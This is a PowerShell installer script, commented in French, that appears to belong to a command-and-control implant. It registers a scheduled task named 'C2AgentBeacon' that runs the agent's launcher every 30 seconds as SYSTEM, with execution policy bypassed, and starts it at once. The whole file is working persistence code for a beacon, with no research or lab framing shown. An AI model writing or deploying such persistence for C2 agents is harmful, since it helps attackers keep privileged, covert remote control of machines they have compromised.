#Requires -Version 5.0
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Script d'installation de la tâche planifiée pour l'agent C2

.DESCRIPTION
    Ce script crée une tâche planifiée qui exécute régulièrement l'agent C2
    Il doit être exécuté après l'installation du MSI

.PARAMETER InstallPath
    Chemin d'installation de l'agent C2 (par défaut: C:\Program Files\C2Agent)

.PARAMETER TaskName
    Nom de la tâche planifiée (par défaut: C2AgentBeacon)

.PARAMETER IntervalMinutes
    Intervalle en minutes entre chaque exécution (par défaut: 0.5 = 30 secondes)

.EXAMPLE
    .\install-scheduled-task.ps1 -InstallPath "C:\Program Files\C2Agent" -TaskName "C2AgentBeacon"
#>

param(
    [string]$InstallPath = "C:\Program Files\C2Agent",
    [string]$TaskName = "C2AgentBeacon",
    [double]$IntervalMinutes = 0.5
)

$ErrorActionPreference = "Stop"

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    $color = switch ($Level) {
        "ERROR" { "Red" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        default { "White" }
    }
    
    Write-Host $logEntry -ForegroundColor $color
}

# Vérifier les prérequis
Write-Log "Vérification des prérequis..." "INFO"

if (-not (Test-Path -Path $InstallPath)) {
    Write-Log "Répertoire d'installation non trouvé: $InstallPath" "ERROR"
    exit 1
}

$launcherPath = Join-Path -Path $InstallPath -ChildPath "launcher.ps1"
if (-not (Test-Path -Path $launcherPath)) {
    Write-Log "Fichier launcher.ps1 non trouvé: $launcherPath" "ERROR"
    exit 1
}

Write-Log "Répertoire d'installation trouvé: $InstallPath" "SUCCESS"

# Suppression de la tâche existante si elle existe
Write-Log "Vérification de tâche existante: $TaskName" "INFO"

$existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($existingTask) {
    Write-Log "Suppression de la tâche existante..." "WARNING"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Start-Sleep -Milliseconds 500
}

# Créer l'action de la tâche
Write-Log "Création de l'action de la tâche..." "INFO"

$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$launcherPath`""

# Créer le trigger (toutes les 30 secondes ou selon IntervalMinutes)
Write-Log "Création du trigger (intervalle: $IntervalMinutes minutes)..." "INFO"

$trigger = New-ScheduledTaskTrigger `
    -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) `
    -At (Get-Date) `
    -Once

# Créer les paramètres de la tâche
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -MultipleInstances IgnoreNew

# Créer la tâche avec privilèges élevés
Write-Log "Enregistrement de la tâche planifiée..." "INFO"

try {
    $task = Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -RunLevel Highest `
        -User "SYSTEM" `
        -Description "C2 Autonomous Agent - Beacon execution"
    
    Write-Log "Tâche planifiée créée avec succès: $TaskName" "SUCCESS"
    Write-Log "Prochaine exécution: $(($task.Triggers[0]).StartBoundary)" "INFO"
}
catch {
    Write-Log "Erreur lors de la création de la tâche: $_" "ERROR"
    exit 1
}

# Test d'exécution manuelle (optionnel)
Write-Log "Démarrage manuel de la tâche pour test..." "INFO"

try {
    Start-ScheduledTask -TaskName $TaskName
    Write-Log "Tâche démarrée manuellement" "SUCCESS"
    
    # Attendre un moment et vérifier le statut
    Start-Sleep -Seconds 2
    $taskStatus = Get-ScheduledTask -TaskName $TaskName
    Write-Log "État de la tâche: $($taskStatus.State)" "INFO"
}
catch {
    Write-Log "Attention: La tâche n'a pas pu être démarrée manuellement: $_" "WARNING"
}

Write-Log "" "INFO"
Write-Log "Installation complétée !" "SUCCESS"
Write-Log "Tâche planifiée: $TaskName" "INFO"
Write-Log "Intervalle d'exécution: $IntervalMinutes minutes" "INFO"
Write-Log "Chemin du lanceur: $launcherPath" "INFO"
Write-Log "" "INFO"
Write-Log "Pour vérifier la tâche:" "INFO"
Write-Log "  Get-ScheduledTask -TaskName '$TaskName'" "INFO"
Write-Log "" "INFO"
Write-Log "Pour voir les logs:" "INFO"
Write-Log "  Get-Content '$InstallPath\logs\agent.log' -Tail 50" "INFO"
Write-Log "" "INFO"
